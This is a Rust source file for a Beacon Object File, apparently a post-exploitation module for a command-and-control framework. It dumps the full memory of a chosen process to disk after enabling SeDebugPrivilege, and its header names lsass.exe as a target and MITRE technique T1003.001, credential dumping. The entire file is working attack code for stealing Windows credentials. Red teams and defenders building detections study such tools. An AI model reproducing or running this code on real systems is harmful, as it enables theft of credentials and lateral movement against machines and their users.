//! # Process Dump BOF
//!
//! Dumps process memory to a file using MiniDumpWriteDump. Enables
//! SeDebugPrivilege before opening the target process so that privileged
//! processes (e.g., lsass.exe) can be dumped.
//!
//! ## MITRE ATT&CK
//! - T1003.001 - OS Credential Dumping: LSASS Memory
//!
//! ## Arguments
//! - `int`: Target process ID.
//! - `str`: Output file path (e.g., `C:\Windows\Temp\dump.dmp`).

#![no_std]

use rustbof::data::DataParser;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, LUID, ERROR_SUCCESS, FALSE,
};
use windows_sys::Win32::Security::{
    AdjustTokenPrivileges, LookupPrivilegeValueA, SE_PRIVILEGE_ENABLED,
    TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES,
};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileA, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
};
use windows_sys::Win32::System::Threading::{
    GetCurrentProcess, OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
    OpenProcessToken,
};
use windows_sys::Win32::Foundation::GENERIC_WRITE;

const INVALID_HANDLE_VALUE: *mut core::ffi::c_void = -1isize as *mut core::ffi::c_void;
const MINIDUMP_WITH_FULL_MEMORY: u32 = 2;

unsafe extern "system" {
    fn MiniDumpWriteDump(
        process: *mut core::ffi::c_void,
        process_id: u32,
        file: *mut core::ffi::c_void,
        dump_type: u32,
        exception: *mut core::ffi::c_void,
        user_stream: *mut core::ffi::c_void,
        callback: *mut core::ffi::c_void,
    ) -> i32;
}

fn enable_debug_privilege() -> u32 {
    unsafe {
        let mut token: *mut core::ffi::c_void = core::ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut token) == FALSE {
            return GetLastError();
        }

        let mut luid: LUID = core::mem::zeroed();
        let priv_name = b"SeDebugPrivilege\0";
        if LookupPrivilegeValueA(
            core::ptr::null(),
            priv_name.as_ptr(),
            &mut luid,
        ) == FALSE
        {
            let err = GetLastError();
            CloseHandle(token);
            return err;
        }

        let mut tp: TOKEN_PRIVILEGES = core::mem::zeroed();
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if AdjustTokenPrivileges(
            token,
            FALSE,
            &tp,
            core::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        ) == FALSE
        {
            let err = GetLastError();
            CloseHandle(token);
            return err;
        }

        let err = GetLastError();
        CloseHandle(token);
        err
    }
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut parser = DataParser::new(args, len);
    let pid = parser.get_int() as u32;
    let output_path = parser.get_str();

    let status = enable_debug_privilege();
    if status != ERROR_SUCCESS {
        eprintln!("Warning: Failed to enable SeDebugPrivilege (error {})", status);
    } else {
        println!("Enabled SeDebugPrivilege");
    }

    let process = unsafe {
        OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid)
    };
    if process.is_null() {
        let err = unsafe { GetLastError() };
        eprintln!("Failed to open process {} (error {})", pid, err);
        return;
    }

    let path_cstr = rustbof::str::to_cstr(output_path);
    let file = unsafe {
        CreateFileA(
            path_cstr.as_ptr() as *const u8,
            GENERIC_WRITE,
            0,
            core::ptr::null(),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            core::ptr::null_mut(),
        )
    };
    if file == INVALID_HANDLE_VALUE {
        let err = unsafe { GetLastError() };
        eprintln!("Failed to create file '{}' (error {})", output_path, err);
        unsafe { CloseHandle(process) };
        return;
    }

    let result = unsafe {
        MiniDumpWriteDump(
            process,
            pid,
            file,
            MINIDUMP_WITH_FULL_MEMORY,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        )
    };

    if result == 0 {
        let err = unsafe { GetLastError() };
        eprintln!("MiniDumpWriteDump failed (error {})", err);
    } else {
        println!("Successfully dumped process {} to '{}'", pid, output_path);
    }

    unsafe {
        CloseHandle(file);
        CloseHandle(process);
    }
}
